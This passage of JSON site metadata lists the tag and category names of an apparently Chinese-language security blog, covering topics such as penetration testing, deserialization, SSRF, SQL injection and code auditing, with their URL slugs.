pt/"},{"name":"docker","slug":"docker","link":"/tags/docker/"},{"name":"jboss","slug":"jboss","link":"/tags/jboss/"},{"name":"shiro","slug":"shiro","link":"/tags/shiro/"},{"name":"内网渗透","slug":"内网渗透","link":"/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"端口转发","slug":"端口转发","link":"/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"},{"name":"反弹shell","slug":"反弹shell","link":"/tags/%E5%8F%8D%E5%BC%B9shell/"},{"name":"知识体系","slug":"知识体系","link":"/tags/%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB/"},{"name":"溯源分析","slug":"溯源分析","link":"/tags/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/"},{"name":"cmake","slug":"cmake","link":"/tags/cmake/"},{"name":"数据库提权","slug":"数据库提权","link":"/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"},{"name":"MsSQL","slug":"MsSQL","link":"/tags/MsSQL/"},{"name":"MySQL","slug":"MySQL","link":"/tags/MySQL/"},{"name":"Redis","slug":"Redis","link":"/tags/Redis/"},{"name":"Oracle","slug":"Oracle","link":"/tags/Oracle/"},{"name":"log4j2","slug":"log4j2","link":"/tags/log4j2/"},{"name":"红日靶场","slug":"红日靶场","link":"/tags/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/"},{"name":"信息收集","slug":"信息收集","link":"/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"代理转发","slug":"代理转发","link":"/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"},{"name":"thinkphp5","slug":"thinkphp5","link":"/tags/thinkphp5/"},{"name":"thinkphp3","slug":"thinkphp3","link":"/tags/thinkphp3/"},{"name":"74cms","slug":"74cms","link":"/tags/74cms/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"PHP语言特性","slug":"PHP语言特性","link":"/tags/PHP%E8%AF%AD%E8%A8%80%E7%89%B9%E6%80%A7/"},{"name":"PHP反序列化","slug":"PHP反序列化","link":"/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"SSTI","slug":"SSTI","link":"/tags/SSTI/"},{"name":"Flask","slug":"Flask","link":"/tags/Flask/"},{"name":"Pickle","slug":"Pickle","link":"/tags/Pickle/"},{"name":"PyYaml","slug":"PyYaml","link":"/tags/PyYaml/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"redis","slug":"redis","link":"/tags/redis/"},{"name":"SSRF","slug":"SSRF","link":"/tags/SSRF/"},{"name":"sql-injection","slug":"sql-injection","link":"/tags/sql-injection/"},{"name":"护网演练","slug":"护网演练","link":"/tags/%E6%8A%A4%E7%BD%91%E6%BC%94%E7%BB%83/"}],"categories":[{"name":"安全竞赛","slug":"安全竞赛","link":"/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"},{"name":"环境配置","slug":"环境配置","link":"/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"name":"web安全","slug":"web安全","link":"/categories/web%E5%AE%89%E5%85%A8/"},{"name":"工具开发","slug":"工具开发","link":"/categories/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"vulfocus","slug":"vulfocus","link":"/categories/vulfocus/"},{"name":"Security","slug":"Security","link":"/categories/Security/"},{"name":"android","slug":"android","link":"/categories/android/"},{"name":"微信公众号","slug":"微信公众号","link":"/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"},{"name":"攻防渗透","slug":"攻防渗透","link":"/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"},{"name":"内网渗透","slug":"内网渗透","link":"/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"PHP代码审计","slug":"PHP代码审计","link":"/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"jni","slug":"android/jni","link":"/categories/android/jni/"},{"name":"python代码审计","slug":"python代码审计","link":"/categories/python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]}